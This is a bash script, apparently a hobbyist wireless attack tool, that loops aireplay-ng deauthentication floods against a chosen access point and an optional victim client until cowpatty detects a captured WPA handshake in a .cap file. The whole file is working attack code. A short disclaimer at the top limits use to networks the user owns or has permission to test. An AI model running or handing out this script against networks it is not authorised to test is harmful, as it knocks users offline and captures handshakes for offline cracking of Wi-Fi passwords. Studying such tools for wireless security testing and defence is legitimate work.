#!/bin/bash
#Colors for colored output
RED='\033[0;31m'
GREEN='\033[0;32m'
ORANGE='\033[1;33m'
LINE='\033[1;34m'
GREY='\033[0;37m'
NC='\033[0m' #Reset color

#Function to make a bash loop
function jumpto
{
    label=$1
    cmd=$(sed -n "/$label:/{:a;n;p;ba};" $0 | grep -v ':$')
    eval "$cmd"
    exit
}
start=${1:-"start"}
finish=${1:-"finish"}

count=0

#Request required info
clear
echo "Welcome to Spoons deauth script!"
echo -e "${RED}This tool is meant for educational purposes only, only use this on your own network or a network where you have explicit permission to do so.${NC}"
echo -e "${GREY}You must be running the following command while using this tool:"
echo -e "airodump-ng -c (CHANNEL FROM AP) -w (OUTPUT-FILENAME) --bssid (MAC FROM AP) (MONITOR LIKE wlan0mon)${NC}" && echo ""

echo "Please enter the MAC from the AP you would like to attack:"
read target
echo ""

echo "(Optional) Please enter the MAC from the target victim:"
read victim
echo ""

echo "Please enter the name of your .cap file: (including extention)"
echo "Only .cap files stored in /root/home will be accepted."
read cappath

#Handshake status
status="${RED}False${NC}"
#Timer
starttime=$SECONDS
#Begin the loop
jumpto $start

#Box with attack info
start:
clear
echo -e "${LINE}+------------------------------------------------+${NC}"
echo -e "\tAttacking access point:\t$target"

if [[ !  -z  $victim  ]]
then
	echo -e "\tTargeting user:\t\t$victim"
else
	echo -e "\tTargeting user:\t\tNone"
fi
echo -e "\tHandshake captured:\t$status"
duration=$((( SECONDS - starttime )/60))
echo -e "\tRuntime:\t\t$duration minutes"

let "count += 1"
echo -e "\tAttempt: \t\t#$count"
echo -e "${LINE}+------------------------------------------------+${NC}" && echo ""

#Attack the entire network and the specific client seperately
echo -e "\tAttacking the entire network."
sudo aireplay-ng -0 50 -a $target wlan0 >/dev/null 2>&1
if [[ !  -z  $victim  ]]
then
	echo -e "\t10 Second attack cooldown..."
	sleep 10
	echo "" && echo -e "\tAttacking specific user."
	sudo aireplay-ng -0 50 -a $target -c $victim wlan0 >/dev/null 2>&1
fi

#Check for a valid handshake
echo "" && echo -e "\tChecking for a handshake..."
result=$(cowpatty -c -r $cappath)

if [[ $result = *'incomplete'* ]]
then
	echo -e " \t  No successful handshake."
elif [[ $result = *'Collected'* ]]
then
	echo -e "\t  Handshake success!"
	status="${GREEN}True${NC}"
	sleep 5
	jumpto $finish
else
	echo -e "\t  Unexpected response."
	status="${ORANGE}ERROR${NC}"
fi

echo "" && echo -e "\t60 Second attack cooldown..."
sleep 58
echo -e "\tRestarting the attack."
sleep 2

#Reboot
jumpto $start

#Give a short attack recap
finish:
clear
echo "                        Recap"
echo -e "${LINE}+------------------------------------------------+${NC}"
echo -e "\tAttacked access point:\t$target"

if [[ !  -z  $victim  ]]
then
	echo -e "\tTargeted user:\t\t$victim"
else
	echo -e "\tTargeted user:\t\tNone"
fi
echo -e "\tHandshake captured:\t$status"
duration=$((( SECONDS - starttime )/60))
echo -e "\tRuntime:\t\t$duration minutes"

echo -e "\tAttempts: \t\t$count"
echo -e "${LINE}+------------------------------------------------+${NC}" && echo ""

